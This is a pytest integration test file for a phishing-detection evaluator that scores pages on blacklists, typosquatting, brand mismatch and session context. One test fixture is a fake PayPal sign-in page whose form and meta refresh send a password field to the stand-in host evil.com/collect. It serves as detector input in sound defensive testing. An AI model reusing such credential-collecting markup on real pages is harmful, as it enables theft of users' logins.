"""Integration tests for StageAEvaluator.

Verifies the full pipeline: FeatureExtractor → ExtractedFeatures → StageAEvaluator → EvaluationResult.
"""

from datetime import datetime, timedelta, timezone

import pytest
from unittest.mock import patch

from backend.feature_extraction.feature_extractor import FeatureExtractor
from backend.analysis.stages.stage_a import StageAEvaluator
from backend.analysis.rules import (
    AMBIGUOUS_LOW,
    HIGH_RISK_THRESHOLD,
    Decision,
    PriorEvent,
    RuleResult,
    RuleType,
    SessionContext,
)

from helpers import (
    make_features,
    HTML_PASSWORD_FORM,
    HTML_BENIGN,
    HTML_PAYPAL_TITLE,
    HTML_EXTERNAL_FORM_ACTION,
)


# Combined-signal HTML used to push a fake-PayPal page into the ambiguous
# deterministic range (sensitive_fields + brand_domain_mismatch +
# external_form_action) so contextual rules are exercised.
HTML_PAYPAL_FAKE_WITH_EXTERNAL_FORM = """
<html><head><title>PayPal Sign In</title>
<meta http-equiv="refresh" content="0; url=https://evil.com/collect">
</head>
<body>
  <form action="https://evil.com/collect" method="post">
    <input type="password" name="password">
  </form>
</body></html>
"""

_BLACKLIST_MOCK = "backend.analysis.stages.stage_a.deterministic_rules.blacklist_cache.is_listed"


class TestStageAEvaluatorPipeline:
    """Verify ExtractedFeatures flows correctly into the evaluator."""

    def test_feature_extractor_output_is_accepted(self):
        """StageAEvaluator.evaluate() must accept FeatureExtractor output without error."""
        extractor = FeatureExtractor()
        features = extractor.extract(
            url="https://example.com/page",
            method="GET",
            headers={"content-type": "text/html"},
            body=HTML_BENIGN.encode(),
        )
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)

        assert result is not None
        assert result.decision in list(Decision)
        assert 0.0 <= result.risk_score <= 1.0
        assert len(result.rule_results) > 0

    def test_result_has_entry_for_every_rule(self):
        """Every deterministic rule should produce a RuleResult (triggered or skipped)."""
        from backend.analysis.rules import DETERMINISTIC_RULES, is_rule_enabled

        features = make_features("https://example.com", HTML_BENIGN)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)

        rule_ids = {r.rule_id for r in result.rule_results}
        expected_ids = {r.rule_id for r in DETERMINISTIC_RULES if is_rule_enabled(r.rule_id)}
        assert rule_ids == expected_ids


class TestStageADecisions:
    """Verify correct ALLOW / WARN / BLOCK decisions for known scenarios."""

    def test_clean_https_page_is_allowed(self):
        features = make_features("https://example.com", HTML_BENIGN)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        assert result.decision == Decision.ALLOW
        assert not result.hard_block_triggered

    def test_http_page_is_soft_signal_not_hard_blocked(self):
        """HTTP is no longer an automatic hard block. Auto-blocking every HTTP
        page created a false-positive floor on benign HTTP pages, so it is now a
        soft weighted signal (still fires, but the decision comes from the
        aggregate score)."""
        features = make_features("http://example.com/login", HTML_PASSWORD_FORM)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        assert not result.hard_block_triggered
        unenc = next(r for r in result.rule_results if r.rule_id == "unencrypted_connection")
        assert unenc.triggered and unenc.score == 1.0
        assert result.risk_score > 0.0

    def test_blacklisted_domain_is_hard_blocked(self):
        features = make_features("https://phishing-site.com/login", HTML_PASSWORD_FORM)
        with patch(_BLACKLIST_MOCK, return_value=(True, "PhishTank")):
            result = StageAEvaluator().evaluate(features)
        assert result.decision == Decision.BLOCK
        assert result.hard_block_triggered

    def test_hard_block_skips_remaining_rules(self):
        """After a hard block, all subsequent rules must have score=None."""
        features = make_features("https://phishing-site.com/login")
        with patch(_BLACKLIST_MOCK, return_value=(True, "PhishTank")):
            result = StageAEvaluator().evaluate(features)

        triggered = next(r for r in result.rule_results if r.rule_id == "domain_blacklist")
        assert triggered.score == 1.0

        skipped = [r for r in result.rule_results if r.score is None]
        assert len(skipped) > 0

    def test_custom_blacklist_hard_blocks(self):
        features = make_features("https://internal-blocked.com/login")
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator(
                custom_blacklist=frozenset({"internal-blocked.com"})
            ).evaluate(features)
        assert result.decision == Decision.BLOCK
        assert result.hard_block_triggered

    def test_typosquat_is_detected_as_soft_signal(self):
        """paypa1.com (a confusable of paypal) is still flagged by the
        typosquatting rule, but as a soft weighted signal — it no longer hard
        blocks. The old hard block fired on more benign than phishing pages, so
        auto-blocking on it blocked legitimate sites."""
        features = make_features("https://paypa1.com/login", HTML_PASSWORD_FORM)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        assert not result.hard_block_triggered
        typo = next((r for r in result.rule_results if r.rule_id == "typosquatting"), None)
        assert typo is not None and typo.triggered and typo.score == 1.0
        assert result.risk_score > 0.0

    def test_brand_mismatch_with_sensitive_fields_raises_score(self):
        """Brand mismatch + sensitive fields should produce a non-zero risk score."""
        features = make_features("https://paypal-fake.com/login", HTML_PAYPAL_TITLE)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        assert result.risk_score > 0.0

    def test_external_form_action_raises_score(self):
        features = make_features("https://bank.com/login", HTML_EXTERNAL_FORM_ACTION)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        assert result.risk_score > 0.0

    def test_multiple_soft_signals_raise_score(self):
        """Brand mismatch + sensitive fields should produce a non-zero risk score."""
        features = make_features("https://paypal-fake.com/login", HTML_PAYPAL_TITLE)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        # brand_domain_mismatch should have fired (sensitive_fields is disabled in code)
        triggered = [r.rule_id for r in result.rule_results if r.triggered]
        assert "brand_domain_mismatch" in triggered
        assert "sensitive_fields" not in triggered
        assert result.risk_score > 0.0

    def test_ip_based_url_raises_score(self):
        features = make_features("https://203.0.113.5/login", HTML_PASSWORD_FORM)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)
        assert result.risk_score > 0.0

    def test_disabled_unencrypted_rule_is_skipped(self):
        features = make_features("http://example.com", HTML_BENIGN)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(
                features,
                enabled_rules={"unencrypted_connection": False},
            )
        assert all(r.rule_id != "unencrypted_connection" for r in result.rule_results)
        assert result.decision == Decision.ALLOW

    def test_disabled_custom_blacklist_rule_does_not_block(self):
        features = make_features("https://internal-blocked.com/login", HTML_BENIGN)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator(
                custom_blacklist=frozenset({"internal-blocked.com"})
            ).evaluate(
                features,
                enabled_rules={"custom_blacklist": False},
            )
        assert all(r.rule_id != "custom_blacklist" for r in result.rule_results)
        assert not result.hard_block_triggered

    def test_disabled_contextual_rule_is_skipped_generically(self):
        features = make_features("https://example.com/login", HTML_PASSWORD_FORM)
        contextual_result = RuleResult(
            rule_id="session_velocity",
            rule_type=RuleType.CONTEXTUAL,
            score=1.0,
            hard_block=False,
            explanation="Session looks suspicious",
            triggered=True,
        )
        with (
            patch(_BLACKLIST_MOCK, return_value=(False, "not listed")),
            patch(
                "backend.analysis.stages.stage_a.evaluator._run_contextual_rules",
                return_value=[contextual_result],
            ),
        ):
            result = StageAEvaluator().evaluate(
                features,
                enabled_rules={"session_velocity": False},
            )

        assert all(r.rule_id != "session_velocity" for r in result.rule_results)


# ---------------------------------------------------------------------------
# Contextual rule integration with the evaluator pipeline
# ---------------------------------------------------------------------------

class TestStageAContextualRules:
    """Contextual rules only run inside the ambiguous deterministic range."""

    AMBIGUOUS_URL = "https://paypal-fake.com/login"
    HIGH_RISK_TS = datetime(2026, 5, 17, 10, 0, 0, tzinfo=timezone.utc)

    def _ambiguous_features(self):
        return make_features(self.AMBIGUOUS_URL, HTML_PAYPAL_FAKE_WITH_EXTERNAL_FORM)

    def _session_with_warned_revisits(self) -> SessionContext:
        prior = [
            PriorEvent(
                timestamp=self.HIGH_RISK_TS - timedelta(seconds=120),
                host="paypal-fake.com",
                guard_action="Warn",
                risk_score=0.55,
            ),
            PriorEvent(
                timestamp=self.HIGH_RISK_TS - timedelta(seconds=60),
                host="paypal-fake.com",
                guard_action="Warn",
                risk_score=0.55,
            ),
        ]
        return SessionContext(
            current_event_timestamp=self.HIGH_RISK_TS,
            current_event_host="paypal-fake.com",
            prior_events=prior,
        )

    def test_contextual_rules_skip_below_ambiguous_low(self):
        features = make_features("https://example.com", HTML_BENIGN)
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(features)

        assert result.risk_score < AMBIGUOUS_LOW
        assert all(r.rule_type != RuleType.CONTEXTUAL for r in result.rule_results)

    def test_contextual_rules_skip_after_hard_block(self):
        # Use a still-hard-blocking rule (domain_blacklist) now that HTTP is soft.
        features = make_features("https://phishing-site.com/login", HTML_PASSWORD_FORM)
        with patch(_BLACKLIST_MOCK, return_value=(True, "PhishTank")):
            result = StageAEvaluator().evaluate(
                features,
                session=self._session_with_warned_revisits(),
            )

        assert result.hard_block_triggered
        assert all(r.rule_type != RuleType.CONTEXTUAL for r in result.rule_results)

    def test_contextual_rules_run_in_ambiguous_range(self):
        features = self._ambiguous_features()
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            no_session = StageAEvaluator().evaluate(features)

        assert AMBIGUOUS_LOW <= no_session.risk_score < HIGH_RISK_THRESHOLD
        contextual = [r for r in no_session.rule_results if r.rule_type == RuleType.CONTEXTUAL]
        assert {r.rule_id for r in contextual} == {
            "sensitive_action_frequency_spike",
            "repeated_sensitive_action_after_warning",
            "redirect_to_sensitive_action",
            "previously_warned_domain_in_session",
        }
        # With an empty session, contextual rules report `score=None` (skipped)
        # so the deterministic-only score is preserved (no dilution).
        assert all(r.score is None for r in contextual)
        assert all(not r.triggered for r in contextual)

    def test_contextual_rules_raise_aggregate_score_when_session_is_loaded(self):
        features = self._ambiguous_features()
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            without_session = StageAEvaluator().evaluate(features)
            with_session = StageAEvaluator().evaluate(
                features,
                session=self._session_with_warned_revisits(),
            )

        triggered_contextual = [
            r for r in with_session.rule_results
            if r.rule_type == RuleType.CONTEXTUAL and r.triggered
        ]
        assert len(triggered_contextual) >= 1
        assert with_session.risk_score > without_session.risk_score

    def test_disabled_real_contextual_rule_is_excluded(self):
        features = self._ambiguous_features()
        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
            result = StageAEvaluator().evaluate(
                features,
                session=self._session_with_warned_revisits(),
                enabled_rules={"previously_warned_domain_in_session": False},
            )

        assert all(
            r.rule_id != "previously_warned_domain_in_session"
            for r in result.rule_results
        )
        # Other contextual rules must still appear.
        contextual_ids = {
            r.rule_id for r in result.rule_results if r.rule_type == RuleType.CONTEXTUAL
        }
        assert "redirect_to_sensitive_action" in contextual_ids
